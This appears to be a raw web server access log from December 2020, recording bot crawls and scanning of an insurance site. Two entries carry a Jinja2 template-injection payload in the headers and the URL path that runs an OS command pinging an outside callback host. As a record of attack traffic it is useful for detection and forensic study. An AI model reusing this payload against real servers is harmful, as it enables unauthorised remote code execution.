::ffff:127.0.0.1 - - [09/Dec/2020:00:48:40 +0000] "GET /get_home_nsurance HTTP/1.1" 200 48331 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [09/Dec/2020:00:50:20 +0000] "GET /get_business_nsurance HTTP/1.1" 200 46633 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [09/Dec/2020:01:00:30 +0000] "GET / HTTP/1.1" 200 62517 "{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").popen("ping ssti-swiftbullhead.com.01h4x.com").read()}}{%endif%}{% endfor %}" "{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").popen("ping ssti-swiftbullhead.com.01h4x.com").read()}}{%endif%}{% endfor %}"
::ffff:127.0.0.1 - - [09/Dec/2020:01:00:33 +0000] "GET /%7B%25%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx()._module.__builtins__%5B'__import__'%5D('os').popen(%22ping%20ssti-swiftbullhead.com.01h4x.com%22).read()%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D%0A HTTP/1.1" 404 444 "{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").popen("ping ssti-swiftbullhead.com.01h4x.com").read()}}{%endif%}{% endfor %}" "{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").popen("ping ssti-swiftbullhead.com.01h4x.com").read()}}{%endif%}{% endfor %}"
::ffff:127.0.0.1 - - [09/Dec/2020:01:50:33 +0000] "GET /blog-details/25 HTTP/1.1" 200 32470 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:127.0.0.1 - - [09/Dec/2020:01:53:06 +0000] "GET / HTTP/1.1" 200 62517 "-" "-"
::ffff:127.0.0.1 - - [09/Dec/2020:01:55:04 +0000] "POST /sdk HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
::ffff:127.0.0.1 - - [09/Dec/2020:01:55:05 +0000] "HEAD / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
::ffff:127.0.0.1 - - [09/Dec/2020:01:55:05 +0000] "GET / HTTP/1.1" 200 62517 "-" "-"
::ffff:127.0.0.1 - - [09/Dec/2020:01:55:05 +0000] "GET / HTTP/1.1" 200 62517 "-" "-"
